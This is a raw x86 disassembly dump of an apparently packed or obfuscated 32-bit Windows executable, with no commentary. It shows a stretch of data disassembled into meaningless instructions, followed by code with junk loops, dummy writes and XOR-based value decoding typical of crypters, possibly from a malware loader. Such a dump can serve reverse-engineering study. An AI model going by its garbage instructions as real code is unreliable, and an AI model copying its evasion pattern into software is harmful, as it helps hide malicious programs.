  408b6b:	sub    ebx,DWORD PTR [edi+0x17054856]
  408b71:	call   0xa1f7:0x2a589446
  408b78:	push   edi
  408b79:	sahf   
  408b7a:	pop    esi
  408b7b:	mov    edx,0x3d2c4e43
  408b80:	push   0xec96ea4
  408b85:	push   esi
  408b86:	xchg   edx,eax
  408b87:	cmp    cl,BYTE PTR [edx+0x6f]
  408b8a:	call   0xf6a4:0xa1f21183
  408b91:	in     al,0x29
  408b93:	dec    esp
  408b94:	dec    esp
  408b95:	inc    ebp
  408b96:	lods   al,BYTE PTR ds:[esi]
  408b97:	jno    0x408b85
  408b99:	jae    0x408bac
  408b9b:	dec    esi
  408b9c:	jo     0x408b3f
  408b9e:	adc    cl,dl
  408ba0:	xchg   ebx,eax
  408ba1:	sbb    BYTE PTR [ecx],dh
  408ba3:	imul   edx,edi,0x14dbef2e
  408ba9:	jle    0x408b50
  408bab:	cmc    
  408bac:	push   0xffffff8f
  408bae:	sar    DWORD PTR [esi+0x1d],cl
  408bb1:	xlat   BYTE PTR ds:[bx]
  408bb3:	clc    
  408bb4:	add    BYTE PTR [ecx+0x33ca6d58],al
  408bba:	mov    WORD PTR [ebp+0x14c9fe7b],es
  408bc0:	xchg   ebp,eax
  408bc1:	jg     0x408b50
  408bc3:	out    0x5,al
  408bc5:	cmp    eax,0x8bf3a646
  408bca:	sub    BYTE PTR [esi+0x5c366be5],dl
  408bd0:	xchg   BYTE PTR [ebx],ch
  408bd2:	daa    
  408bd3:	int3   
  408bd4:	bound  ebx,QWORD PTR [edi-0x1c]
  408bd7:	(bad)  
  408bd8:	mov    bl,0x4d
  408bda:	push   ss
  408bdb:	pop    ebx
  408bdc:	aam    0xb8
  408bde:	jns    0x408bbb
  408be0:	in     al,0xf3
  408be2:	shl    BYTE PTR [ecx],0x95
  408be5:	lahf   
  408be6:	stc    
  408be7:	imul   cx,WORD PTR [edi],0xb741
  408bec:	lods   eax,DWORD PTR ds:[esi]
  408bed:	cdq    
  408bee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bef:	sbb    BYTE PTR [ecx+0x3e],dh
  408bf2:	lock dec ebx
  408bf4:	retf   
  408bf5:	xor    DWORD PTR [esi+0x25825db2],esp
  408bfb:	or     esi,0x1e617b67
  408c01:	dec    ebp
  408c02:	fisubr WORD PTR [ecx-0x1ab10dbb]
  408c08:	add    BYTE PTR [ebx+0x1b0161c2],cl
  408c0e:	adc    bh,BYTE PTR [edi+ecx*4]
  408c11:	add    esp,DWORD PTR [eax+0x3fc10e8e]
  408c17:	push   ebx
  408c18:	push   0xffffff97
  408c1a:	jns    0x408c20
  408c1c:	push   ds
  408c1d:	dec    esp
  408c1e:	imul   edi,DWORD PTR [ebp+esi*4+0x3e47fac0],0x83502092
  408c29:	mov    esi,DWORD PTR [edx+edi*8+0x1]
  408c2d:	xchg   ebp,eax
  408c2e:	jo     0x408c47
  408c30:	sub    BYTE PTR [eax-0x5],dl
  408c33:	stos   BYTE PTR es:[edi],al
  408c34:	ja     0x408c8f
  408c36:	mov    ds:0xf84d3b80,al
  408c3b:	and    cl,ah
  408c3d:	mov    ecx,edi
  408c3f:	push   eax
  408c40:	dec    edi
  408c41:	(bad)  
  408c42:	jmp    0x408c7c
  408c44:	out    dx,eax
  408c45:	dec    ecx
  408c46:	les    edx,FWORD PTR [ebx+0x524d4d0a]
  408c4c:	fdivr  st(2),st
  408c4e:	mov    WORD PTR [esi],fs
  408c50:	rol    DWORD PTR [ebx],1
  408c52:	ins    DWORD PTR es:[edi],dx
  408c53:	pop    ecx
  408c54:	in     al,dx
  408c55:	iret   
  408c56:	push   ecx
  408c57:	dec    edi
  408c58:	mov    edx,0xd3fc6ba3
  408c5d:	ja     0x408bff
  408c5f:	push   edx
  408c60:	repnz adc BYTE PTR [ecx],dl
  408c63:	inc    edx
  408c64:	mov    DWORD PTR [ebx+0x569ad14f],edx
  408c6a:	sahf   
  408c6b:	dec    eax
  408c6c:	sub    al,0x97
  408c6e:	add    al,0xdc
  408c70:	ror    DWORD PTR [edi+0x36],0xba
  408c74:	pusha  
  408c75:	ss push ecx
  408c77:	mov    ds:0x4ecbd825,eax
  408c7c:	aad    0x85
  408c7e:	mov    ah,0xe5
  408c80:	frstor [ecx+ecx*2-0x72]
  408c84:	or     BYTE PTR [eax+ebx*1+0xf],ah
  408c88:	jg     0x408ca9
  408c8a:	bound  ecx,QWORD PTR [ecx-0x1c80fd55]
  408c90:	xor    al,0x74
  408c92:	adc    BYTE PTR [ebx-0x7a],0xcf
  408c96:	mov    eax,0x79505619
  408c9b:	sbb    BYTE PTR [eax+0x1c926bfe],bh
  408ca1:	or     edx,edi
  408ca3:	(bad)  
  408ca4:	jmp    0x408caa
  408ca6:	lahf   
  408ca7:	push   esi
  408ca8:	pop    edx
  408ca9:	test   BYTE PTR [edi-0x69],bh
  408cac:	fisttp DWORD PTR [ebx+0x61fa08fe]
  408cb2:	mov    WORD PTR [edx+edx*4],ss
  408cb5:	cdq    
  408cb6:	adc    esp,DWORD PTR [eax-0x42]
  408cb9:	sub    eax,0x20c74166
  408cbe:	and    eax,DWORD PTR [ebx+0xf]
  408cc1:	int3   
  408cc2:	mov    al,ds:0x61f09d71
  408cc7:	loopne 0x408d12
  408cc9:	(bad)  
  408cca:	mov    eax,0x4b1c02fb
  408ccf:	inc    esp
  408cd0:	idiv   DWORD PTR ds:0x8e7f7f69
  408cd6:	mov    eax,0x3358162a
  408cdb:	xchg   ecx,eax
  408cdc:	or     DWORD PTR [eax+0x6d10dd7],ebx
  408ce2:	jecxz  0x408cf3
  408ce4:	mov    ecx,0x8c88d351
  408ce9:	adc    esp,ecx
  408ceb:	cld    
  408cec:	or     DWORD PTR gs:[eax+eiz*4+0x57852fbb],edx
  408cf4:	fwait
  408cf5:	add    eax,0x32729d
  408cfa:	mov    DWORD PTR [edx],eax
  408cfc:	mov    edx,DWORD PTR ds:0x4305f6
  408d02:	mov    eax,ds:0x430612
  408d07:	sub    edx,eax
  408d09:	xor    edx,DWORD PTR [edx+eax*1]
  408d0c:	mov    eax,DWORD PTR [ebp+0x14]
  408d0f:	mov    edx,DWORD PTR [ebp+0x10]
  408d12:	mov    DWORD PTR [edx+0x4],eax
  408d15:	mov    eax,DWORD PTR [ebp+0x18]
  408d18:	mov    edx,DWORD PTR [ebp+0x10]
  408d1b:	mov    DWORD PTR [edx+0x8],eax
  408d1e:	mov    eax,DWORD PTR [ebp+0x1c]
  408d21:	mov    edx,DWORD PTR [ebp+0x10]
  408d24:	mov    DWORD PTR [edx+0xc],eax
  408d27:	mov    eax,DWORD PTR [ebp+0x20]
  408d2a:	mov    edx,DWORD PTR [ebp+0x10]
  408d2d:	mov    DWORD PTR [edx+0x10],eax
  408d30:	mov    eax,eax
  408d32:	mov    eax,DWORD PTR [ebp+0x14]
  408d35:	test   eax,eax
  408d37:	mov    eax,DWORD PTR [ebp+0x8]
  408d3a:	jne    0x408f37
  408d40:	mov    eax,DWORD PTR [ebp+0xc]
  408d43:	jmp    0x408f37
  408d48:	test   BYTE PTR [ebx+0x4d],al
  408d4b:	pushf  
  408d4c:	dec    ebp
  408d4d:	pushf  
  408d4e:	inc    ebp
  408d4f:	pop    ebx
  408d50:	cwde   
  408d51:	mov    ss,edx
  408d53:	aaa    
  408d54:	push   0x76
  408d56:	addr16 adc eax,0x7e7ed48c
  408d5c:	inc    ebp
  408d5d:	jg     0x408ddd
  408d5f:	jle    0x408cfe
  408d61:	mov    dl,0x81
  408d63:	call   0xfc74:0x7fc78fcb
  408d6a:	jp     0x408da4
  408d6c:	dec    ebx
  408d6d:	mov    DWORD PTR [ebp+0x25],esi
  408d70:	push   0x3a
  408d72:	pushf  
  408d73:	mov    ch,0xc2
  408d75:	or     al,0x37
  408d77:	xchg   ebp,eax
  408d78:	popf   
  408d79:	mov    eax,ds:0xd749af59
  408d7e:	out    dx,al
  408d7f:	dec    ecx
  408d80:	je     0x408de4
  408d82:	sub    al,0xc8
  408d84:	xor    dh,BYTE PTR [eax+ebp*4]
  408d87:	int    0x4a
  408d89:	sub    ebx,edx
  408d8b:	stos   BYTE PTR es:[edi],al
  408d8c:	lock jmp 0xfbb7:0x4cd7bf8
  408d94:	je     0x408d59
  408d96:	cwde   
  408d97:	jnp    0x408d36
  408d99:	mov    al,ds:0x9114ecb2
  408d9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d9f:	aam    0xef
  408da1:	pop    eax
  408da2:	mov    al,0x47
  408da4:	sub    eax,0x8726477a
  408da9:	rol    dh,1
  408dab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408dac:	aaa    
  408dad:	push   ds
  408dae:	(bad)  
  408daf:	pop    edi
  408db0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408db1:	sbb    BYTE PTR [edi],cl
  408db3:	mov    edi,0xafb6adc6
  408db8:	arpl   WORD PTR [ebp-0x1b0fdab2],ax
  408dbe:	xchg   BYTE PTR [ecx+0xe],dl
  408dc1:	sbb    edx,DWORD PTR [esi-0x10b55398]
  408dc7:	add    al,0x73
  408dc9:	test   DWORD PTR [edi+0x729e3819],esi
  408dcf:	jmp    DWORD PTR [edi]
  408dd1:	rcr    DWORD PTR [edi],cl
  408dd3:	fnstsw WORD PTR [edi+0x3]
  408dd6:	aaa    
  408dd7:	jle    0x408e58
  408dd9:	(bad)  
  408dda:	(bad)  
  408ddc:	dec    ebx
  408ddd:	jg     0x408da8
  408ddf:	sbb    BYTE PTR [ebx-0x13],0x9b
  408de3:	test   eax,0xe6a916af
  408de8:	lahf   
  408de9:	push   ebp
  408dea:	je     0x408e3f
  408dec:	sub    DWORD PTR [edi-0x55],esp
  408def:	dec    ebx
  408df0:	pushf  
  408df1:	mov    es,WORD PTR [ecx-0x650f0f75]
  408df7:	jmp    0x408d8d
  408df9:	adc    DWORD PTR [eax+0x640bbd9a],0xffffffdf
  408e00:	jo     0x408e29
  408e02:	mov    ch,0xa5
  408e04:	jecxz  0x408e72
  408e06:	stos   DWORD PTR es:[edi],eax
  408e07:	sti    
  408e08:	(bad)  
  408e09:	mov    BYTE PTR [esi+0x6b],0x80
  408e0d:	call   DWORD PTR [esi+0x45]
  408e10:	inc    esp
  408e11:	pushf  
  408e12:	xor    BYTE PTR [ebp-0x65f83665],bl
  408e18:	retf   
  408e19:	xor    cl,dl
  408e1b:	mov    ah,0x68
  408e1d:	mov    ds:0xcb858f5d,al
  408e22:	jb     0x408dac
  408e24:	lock gs in al,dx
  408e27:	mov    ah,0x11
  408e29:	cs fs ds xor al,0x94
  408e2e:	(bad)  
  408e30:	rol    BYTE PTR [ecx+eax*1-0x6d1843c3],cl
  408e37:	popa   
  408e38:	cmp    dh,BYTE PTR [edx+0x7d4214ba]
  408e3e:	lods   al,BYTE PTR ds:[esi]
  408e3f:	retf   0x2b4b
  408e42:	(bad)  
  408e43:	daa    
  408e44:	fdiv   QWORD PTR [ebp+0x66]
  408e47:	out    0xbf,eax
  408e49:	dec    esp
  408e4a:	inc    eax
  408e4b:	scas   al,BYTE PTR es:[edi]
  408e4c:	retf   0xfa01
  408e4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e50:	shr    BYTE PTR [ecx-0x3f64f381],0x4f
  408e57:	or     DWORD PTR [esi+ebp*8-0x9e3d59c],esi
  408e5e:	bound  ebp,QWORD PTR [edx]
  408e60:	cmp    esp,DWORD PTR [edx+ebx*4]
  408e63:	mov    eax,ebp
  408e65:	dec    eax
  408e66:	sahf   
  408e67:	movntq QWORD PTR [ebx+0x404f7155],mm1
  408e6e:	(bad)  
  408e6f:	or     eax,0x170b17b4
  408e74:	jp     0x408e9e
  408e76:	retf   
  408e77:	jge    0x408ed9
  408e79:	not    BYTE PTR [edi+0x1f]
  408e7c:	dec    edi
  408e7d:	(bad)  
  408e7e:	sbb    eax,eax
  408e80:	in     eax,dx
  408e81:	mov    cl,dh
  408e83:	retf   0xdbb
  408e86:	in     eax,dx
  408e87:	push   ecx
  408e88:	fild   QWORD PTR [esp+eax*1+0x5b6e19e6]
  408e8f:	xor    BYTE PTR [ecx],cl
  408e91:	inc    edx
  408e92:	(bad)  
  408e93:	fisub  WORD PTR [eax]
  408e95:	inc    esp
  408e96:	mov    al,0x90
  408e98:	mov    ch,0x2e
  408e9a:	add    eax,0x20cf1cf2
  408e9f:	xchg   edx,eax
  408ea0:	or     bh,dl
  408ea2:	adc    DWORD PTR [esi-0x13daa948],ebp
  408ea8:	sbb    ah,BYTE PTR [edi+esi*8+0x24b9558d]
  408eaf:	or     al,0x1b
  408eb1:	icebp  
  408eb2:	push   ecx
  408eb3:	ja     0x1bb57689
  408eb9:	sbb    BYTE PTR [edi-0x29],cl
  408ebc:	cmp    BYTE PTR [eax+0x28],bl
  408ebf:	dec    ebx
  408ec0:	jae    0x408e8e
  408ec2:	jge    0x408e48
  408ec4:	and    eax,0x6fc58b54
  408ec9:	outs   dx,BYTE PTR ds:[esi]
  408eca:	ret    0x5d65
  408ecd:	sahf   
  408ece:	idiv   BYTE PTR [esi+esi*8+0x79]
  408ed2:	cwde   
  408ed3:	in     eax,0x5c
  408ed5:	sub    esi,DWORD PTR [eax+0x4b78e8cd]
  408edb:	(bad)  
  408edc:	fild   QWORD PTR [edx]
  408ede:	jno    0x408e7a
  408ee0:	adc    DWORD PTR [esi-0x77],esp
  408ee3:	gs nop
  408ee5:	xlat   BYTE PTR ds:[bx]
  408ee7:	jbe    0x408e70
  408ee9:	or     ah,dh
  408eeb:	xchg   ebp,eax
  408eec:	cmp    al,bh
  408eee:	cmp    edi,0xbee379b
  408ef4:	int    0x7d
  408ef6:	mov    ecx,0xa620d13
  408efb:	mov    eax,0x3ae66aa7
  408f00:	push   eax
  408f01:	mov    edx,0xfd853b25
  408f06:	adc    eax,0x275d651e
  408f0b:	out    0x93,al
  408f0d:	(bad)
  408f10:	pop    ecx
  408f11:	pushf  
  408f12:	pop    ss
  408f13:	mov    ah,0xa9
  408f15:	nop
  408f16:	pop    ecx
  408f17:	(bad)  
  408f18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f19:	jp     0x408eb7
  408f1b:	das    
  408f1c:	cmp    eax,ebp
  408f1e:	call   0xc7970d69
  408f23:	sub    BYTE PTR [esi+0x478c6baf],bh
  408f29:	push   ebx
  408f2a:	je     0x408f65
  408f2c:	in     al,0xe6
  408f2e:	lahf   
  408f2f:	dec    edx
  408f30:	out    dx,eax
  408f31:	fsubrp st(1),st
  408f33:	mov    ebp,0x339f992f
  408f38:	rol    DWORD PTR ds:0x32729d,0xc9
  408f3f:	ret    0x1c
  408f42:	push   ebp
  408f43:	mov    ebp,esp
  408f45:	sub    esp,0x10c
  408f4b:	push   ebx
  408f4c:	sbb    DWORD PTR ds:0x42ee88,0x42e7ea
  408f56:	push   esi
  408f57:	push   edi
  408f58:	xor    DWORD PTR ds:0x4305c6,0x5477
  408f62:	push   0x412320
  408f67:	sbb    DWORD PTR ds:0x42eea8,0x42e7e6
  408f71:	call   DWORD PTR ds:0x42eacc
  408f77:	sbb    DWORD PTR ds:0x42e7e2,0x6315
  408f81:	test   eax,eax
  408f83:	je     0x408f9a
  408f89:	or     DWORD PTR ds:0x43052e,0x658e
  408f93:	xor    eax,eax
  408f95:	jmp    0x40a1a9
  408f9a:	or     DWORD PTR ds:0x430532,0x1a2e
  408fa4:	push   0x412364
  408fa9:	call   DWORD PTR ds:0x42eb84
  408faf:	sbb    DWORD PTR ds:0x4305d2,0x34b4
  408fb9:	test   ax,ax
  408fbc:	mov    DWORD PTR ds:0x42e7da,0xd26
  408fc6:	je     0x408feb
  408fcc:	push   0x786876
  408fd1:	push   0x55897097
  408fd6:	adc    DWORD PTR ds:0x430542,0x42ee88
  408fe0:	call   DWORD PTR ds:0x42ec00
  408fe6:	jmp    0x40a1a9
  408feb:	sub    DWORD PTR ds:0x42eea4,0x1c30
  408ff5:	call   DWORD PTR ds:0x42ebc4
  408ffb:	cdq    
  408ffc:	cmp    eax,0x67876766
  409001:	mov    DWORD PTR ds:0x4305da,0x4f36
  40900b:	jne    0x409041
  409011:	cmp    edx,0x86189768
  409017:	mov    DWORD PTR ds:0x42ee94,0x24b9
  409021:	jne    0x409041
  409027:	sub    DWORD PTR ds:0x42e7e2,0x452
  409031:	push   0x412380
  409036:	call   DWORD PTR ds:0x42eabc
  40903c:	jmp    0x40a1a9
  409041:	neg    DWORD PTR ds:0x43052a
  409047:	push   0x4123e0
  40904c:	adc    DWORD PTR ds:0x42eea4,0x43051a
  409056:	call   DWORD PTR ds:0x42eb5c
  40905c:	test   ax,ax
  40905f:	jne    0x408f89
  409065:	and    DWORD PTR ds:0x42e7e2,0x0
  40906f:	xor    ebx,ebx
  409071:	xor    ebx,DWORD PTR ds:0x42e7e2
  409077:	inc    ebx
  409078:	mov    DWORD PTR ds:0x42e7e2,ebx
  40907e:	cmp    DWORD PTR ds:0x42e7e2,0x28
  409085:	jne    0x409097
  40908b:	push   DWORD PTR [ebp-0x10]
  40908e:	push   DWORD PTR [ebp-0x18]
  409091:	call   DWORD PTR ds:0x42ec2c
  409097:	cmp    DWORD PTR ds:0x42e7e2,0x1c
  40909e:	jb     0x40906f
  4090a4:	mov    edx,DWORD PTR ds:0x42ee94
  4090aa:	and    DWORD PTR ds:0x42eea0,edx
  4090b0:	mov    ecx,0xf89c8535
  4090b5:	movzx  edx,BYTE PTR ds:0x43050e
  4090bc:	sbb    edx,DWORD PTR ds:0x4305ce
  4090c2:	mov    DWORD PTR ds:0x43050e,edx
  4090c8:	mov    DWORD PTR [ebp-0x20],ecx
  4090cb:	and    DWORD PTR ds:0x43051e,0x0
  4090d5:	mov    edx,DWORD PTR ds:0x43051e
  4090db:	inc    edx
  4090dc:	mov    DWORD PTR ds:0x43051e,edx
  4090e2:	cmp    DWORD PTR ds:0x43051e,0x21
  4090e9:	jne    0x409109
  4090ef:	push   0x59b7
  4090f4:	push   0x42e7fa
  4090f9:	push   0x42e92d
  4090fe:	push   0x7470
  409103:	call   DWORD PTR ds:0x42ec30
  409109:	cmp    DWORD PTR ds:0x43051e,0x15
  409110:	jb     0x4090d5
  409116:	and    DWORD PTR ds:0x42e7e6,0x0
  409120:	mov    edx,DWORD PTR ds:0x42e7e6
  409126:	inc    edx
  409127:	mov    DWORD PTR ds:0x42e7e6,edx
  40912d:	cmp    DWORD PTR ds:0x42e7e6,0x20
  409134:	jne    0x40914a
  40913a:	push   0x704d
  40913f:	push   0x180e
  409144:	call   DWORD PTR ds:0x42eb30
  40914a:	cmp    DWORD PTR ds:0x42e7e6,0x13
  409151:	jb     0x409120
  409157:	adc    DWORD PTR ds:0x43051a,edi
  40915d:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409164:	and    DWORD PTR ds:0x43050a,0x0
  40916e:	mov    esi,DWORD PTR ds:0x43050a
  409174:	inc    esi
  409175:	mov    DWORD PTR ds:0x43050a,esi
  40917b:	cmp    DWORD PTR ds:0x43050a,0xd
  409182:	jne    0x40919d
  409188:	push   0x42e8fb
  40918d:	push   0x42e7fa
  409192:	push   0x400000
  409197:	call   DWORD PTR ds:0x42eb48
  40919d:	cmp    DWORD PTR ds:0x43050a,0xc
  4091a4:	jne    0x4091b7
  4091aa:	mov    esi,DWORD PTR ds:0x43050a
  4091b0:	inc    esi
  4091b1:	mov    DWORD PTR ds:0x43050a,esi
  4091b7:	cmp    DWORD PTR ds:0x43050a,0x14
  4091be:	jb     0x40916e
  4091c4:	sub    esi,DWORD PTR ds:0x42ee9c
  4091ca:	lea    eax,[ebp-0x58]
  4091cd:	mov    DWORD PTR [ebp-0x60],eax
  4091d0:	add    esi,esi
  4091d2:	lea    eax,[ebp-0x50]
  4091d5:	inc    ebx
  4091d6:	mov    DWORD PTR [ebp-0x10],eax
  4091d9:	inc    esi
  4091da:	mov    eax,ds:0x4121a8
  4091df:	mov    eax,DWORD PTR [eax+0x1c8]
  4091e5:	or     DWORD PTR ds:0x4305ce,0x430522
  4091ef:	mov    eax,DWORD PTR [eax]
  4091f1:	add    esi,ebx
  4091f3:	mov    edx,DWORD PTR [ebp-0x10]
  4091f6:	xor    esi,esi
  4091f8:	xor    esi,DWORD PTR ds:0x4305ce
  4091fe:	adc    DWORD PTR ds:0x42ee98,esi
  409204:	mov    esi,0x7510856
  409209:	xor    DWORD PTR ds:0x43050e,ebx
  40920f:	xor    eax,esi
  409211:	mov    ebx,0x32729d
  409216:	add    eax,ebx
  409218:	mov    DWORD PTR [edx],eax
  40921a:	mov    eax,ds:0x43050e
  40921f:	mov    eax,ds:0x4124e4
  409224:	cmp    eax,0x23d14057
  409229:	mov    eax,DWORD PTR [ebp-0x18]
  40922c:	mov    DWORD PTR ds:0x43050e,0x7d60
  409236:	je     0x409262
  40923c:	mov    ecx,DWORD PTR [ebp-0x20]
  40923f:	xor    eax,esi
  409241:	adc    DWORD PTR ds:0x43051e,0x43053a
  40924b:	add    eax,ebx
  40924d:	imul   eax,ecx
  409250:	mov    DWORD PTR ds:0x43052e,0x73a3
  40925a:	mov    DWORD PTR [ebp-0x20],eax
  40925d:	jmp    0x409dc0
  409262:	xor    eax,esi
  409264:	adc    edx,0x5f1b
  40926a:	add    eax,ebx
  40926c:	mov    ds:0x4122b8,eax
  409271:	mov    edx,DWORD PTR ds:0x430562
  409277:	mov    eax,ds:0x42ea1c
  40927c:	sub    eax,edx
  40927e:	or     edx,DWORD PTR [edx+eax*1]
  409281:	mov    eax,DWORD PTR [ebp-0x20]
  409284:	xor    eax,esi
  409286:	add    eax,ebx
  409288:	mov    ds:0x4124e4,eax
  40928d:	sub    DWORD PTR ds:0x42e7ee,0x78a9
  409297:	mov    eax,DWORD PTR [ebp-0x18]
  40929a:	add    edx,DWORD PTR ds:0x43052a
  4092a0:	mov    edx,DWORD PTR ds:0x4122b8
  4092a6:	neg    DWORD PTR ds:0x43053a
  4092ac:	xor    eax,esi
  4092ae:	dec    DWORD PTR ds:0x430532
  4092b4:	add    eax,ebx
  4092b6:	mov    DWORD PTR ds:0x4305d6,0x3216
  4092c0:	cmp    edx,eax
  4092c2:	jne    0x409dc0
  4092c8:	mov    eax,DWORD PTR [ebp-0x18]
  4092cb:	add    edx,0x2278
  4092d1:	mov    DWORD PTR [ebp-0x30],eax
  4092d4:	mov    eax,DWORD PTR [ebp-0x20]
  4092d7:	mov    DWORD PTR ds:0x42eea0,0x10
  4092e1:	cmp    DWORD PTR ds:0x42eea0,0x0
  4092e8:	je     0x409328
  4092ee:	cmp    DWORD PTR ds:0x42eea0,0x16
  4092f5:	jne    0x409310
  4092fb:	push   0x55c8
  409300:	push   0x6c0c
  409305:	push   0x400000
  40930a:	call   DWORD PTR ds:0x42eb4c
  409310:	mov    edi,DWORD PTR ds:0x42eea0
  409316:	dec    edi
  409317:	mov    DWORD PTR ds:0x42eea0,edi
  40931d:	jmp    0x4092e1
  409322:	add    DWORD PTR ds:0x42ee94,ebx
  409328:	mov    DWORD PTR [ebp-0x1c],eax
  40932b:	or     DWORD PTR ds:0x42e7f6,0x513d
  409335:	mov    eax,ds:0x4121a8
  40933a:	mov    eax,DWORD PTR [eax+0x198]
  409340:	not    edx
  409342:	mov    DWORD PTR [ebp-0xc],eax
  409345:	xor    edx,edx
  409347:	add    edx,DWORD PTR ds:0x42e7f2
  40934d:	adc    edx,DWORD PTR ds:0x430542
  409353:	mov    DWORD PTR ds:0x42e7f2,edx
  409359:	mov    eax,DWORD PTR [ebp-0x1c]
  40935c:	mov    edx,DWORD PTR [ebp-0xc]
  40935f:	and    DWORD PTR ds:0x42eeac,0x0
  409369:	mov    edi,DWORD PTR ds:0x42eeac
  40936f:	inc    edi
  409370:	mov    DWORD PTR ds:0x42eeac,edi
  409376:	cmp    DWORD PTR ds:0x42eeac,0x6
  40937d:	jne    0x409391
  409383:	push   DWORD PTR [ebp-0x10]
  409386:	push   0x42e7e6
  40938b:	call   DWORD PTR ds:0x42ec34
  409391:	cmp    DWORD PTR ds:0x42eeac,0x5
  409398:	jne    0x4093ad
  40939e:	xor    edi,edi
  4093a0:	xor    edi,DWORD PTR ds:0x42eeac
  4093a6:	inc    edi
  4093a7:	mov    DWORD PTR ds:0x42eeac,edi
  4093ad:	cmp    DWORD PTR ds:0x42eeac,0x1b
  4093b4:	jb     0x409369
  4093ba:	xor    DWORD PTR ds:0x430532,0x56f9
  4093c4:	xor    eax,esi
  4093c6:	and    DWORD PTR ds:0x42eea8,0x0
  4093d0:	jmp    0x4093e2
  4093d5:	mov    edi,DWORD PTR ds:0x42eea8
  4093db:	inc    edi
  4093dc:	mov    DWORD PTR ds:0x42eea8,edi
  4093e2:	cmp    DWORD PTR ds:0x42eea8,0x1f
  4093e9:	jae    0x40946a
  4093ef:	cmp    DWORD PTR ds:0x42eea8,0x6
  4093f6:	jne    0x409402
  4093fc:	call   DWORD PTR ds:0x42eb50
  409402:	cmp    DWORD PTR ds:0x42eea8,0x5
  409409:	jne    0x40941c
  40940f:	mov    edi,DWORD PTR ds:0x42eea8
  409415:	inc    edi
  409416:	mov    DWORD PTR ds:0x42eea8,edi
  40941c:	jmp    0x4093d5
  409421:	mov    DWORD PTR ds:0x42ee8c,0x12
  40942b:	cmp    DWORD PTR ds:0x42ee8c,0x0
  409432:	je     0x40946a
  409438:	cmp    DWORD PTR ds:0x42ee8c,0x21
  40943f:	jne    0x409450
  409445:	push   0x79c1
  40944a:	call   DWORD PTR ds:0x42eb34
  409450:	xor    edi,edi
  409452:	or     edi,DWORD PTR ds:0x42ee8c
  409458:	dec    edi
  409459:	mov    DWORD PTR ds:0x42ee8c,edi
  40945f:	jmp    0x40942b
  409464:	and    edi,DWORD PTR ds:0x4305da
  40946a:	add    eax,ebx
  40946c:	mov    DWORD PTR [edx],eax
  40946e:	lea    eax,[ebp-0x14]
  409471:	and    edi,DWORD PTR ds:0x43050a
  409477:	mov    DWORD PTR [ebp-0x44],eax
  40947a:	mov    edi,DWORD PTR ds:0x43051e
  409480:	adc    edi,DWORD PTR ds:0x42ee98
  409486:	mov    DWORD PTR ds:0x43051e,edi
  40948c:	mov    eax,DWORD PTR [ebp-0x1c]
  40948f:	sbb    DWORD PTR ds:0x42eeb0,0x42e7ea
  409499:	mov    edx,DWORD PTR [ebp-0x44]
  40949c:	sbb    DWORD PTR ds:0x42eea0,0x43053a
  4094a6:	xor    eax,esi
  4094a8:	add    eax,ebx
  4094aa:	movzx  edi,WORD PTR ds:0x430542
  4094b1:	and    DWORD PTR ds:0x43053e,edi
  4094b7:	mov    DWORD PTR [edx],eax
  4094b9:	add    DWORD PTR ds:0x42e7f6,0x43051a
  4094c3:	mov    DWORD PTR [ebp-0x54],ecx
  4094c6:	or     edi,edi
  4094c8:	lea    eax,[ebp-0x54]
  4094cb:	mov    DWORD PTR [ebp-0x10],eax
  4094ce:	sub    ecx,DWORD PTR ds:0x430526
  4094d4:	mov    eax,DWORD PTR [ebp-0x54]
  4094d7:	mov    ecx,DWORD PTR [ebp-0x10]
  4094da:	mov    DWORD PTR ds:0x42eeac,0x1c
  4094e4:	cmp    DWORD PTR ds:0x42eeac,0x0
  4094eb:	je     0x409533
  4094f1:	cmp    DWORD PTR ds:0x42eeac,0x27
  4094f8:	jne    0x40950c
  4094fe:	push   DWORD PTR [ebp-0x20]
  409501:	push   0x215b
  409506:	call   DWORD PTR ds:0x42ec38
  40950c:	xor    edi,edi
  40950e:	xor    edi,DWORD PTR ds:0x42eeac
  409514:	dec    edi
  409515:	mov    DWORD PTR ds:0x42eeac,edi
  40951b:	jmp    0x4094e4
  409520:	movzx  edi,BYTE PTR ds:0x42e7ea
  409527:	or     edi,DWORD PTR ds:0x4305be
  40952d:	mov    DWORD PTR ds:0x42e7ea,edi
  409533:	xor    eax,esi
  409535:	xor    edi,0xc6b
  40953b:	add    eax,0x32729d
  409540:	mov    DWORD PTR [ecx],eax
  409542:	mov    eax,ds:0x41227c
  409547:	sbb    DWORD PTR ds:0x430522,0x6967
  409551:	mov    DWORD PTR [ebp-0x28],0x8e12febc
  409558:	mov    edi,DWORD PTR ds:0x43051a
  40955e:	sbb    DWORD PTR ds:0x42ee8c,edi
  409564:	mov    eax,DWORD PTR [eax]
  409566:	mov    DWORD PTR ds:0x42eea4,0x19
  409570:	cmp    DWORD PTR ds:0x42eea4,0x0
  409577:	je     0x40961e
  40957d:	cmp    DWORD PTR ds:0x42eea4,0x29
  409584:	jne    0x4095c1
  40958a:	push   DWORD PTR [ebp-0xc]
  40958d:	push   DWORD PTR [ebp-0x1c]
  409590:	push   0x61da
  409595:	push   DWORD PTR [ebp-0xc]
  409598:	push   DWORD PTR [ebp-0x1c]
  40959b:	push   DWORD PTR [ebp-0x20]
  40959e:	push   DWORD PTR [ebp-0x1c]
  4095a1:	push   DWORD PTR [ebp-0x28]
  4095a4:	push   0x400000
  4095a9:	push   DWORD PTR [ebp-0xc]
  4095ac:	push   0x2e1f
  4095b1:	push   0x5a6c
  4095b6:	push   0x7112
  4095bb:	call   DWORD PTR ds:0x42eb38
  4095c1:	xor    edi,edi
  4095c3:	xor    edi,DWORD PTR ds:0x42eea4
  4095c9:	dec    edi
  4095ca:	mov    DWORD PTR ds:0x42eea4,edi
  4095d0:	jmp    0x409570
  4095d5:	and    DWORD PTR ds:0x42e7de,0x0
  4095df:	jmp    0x4095f1
  4095e4:	mov    edi,DWORD PTR ds:0x42e7de
  4095ea:	inc    edi
  4095eb:	mov    DWORD PTR ds:0x42e7de,edi
  4095f1:	cmp    DWORD PTR ds:0x42e7de,0x18
  4095f8:	jae    0x40961e
  4095fe:	cmp    DWORD PTR ds:0x42e7de,0x1f
  409605:	jne    0x409619
  40960b:	push   0x6de3
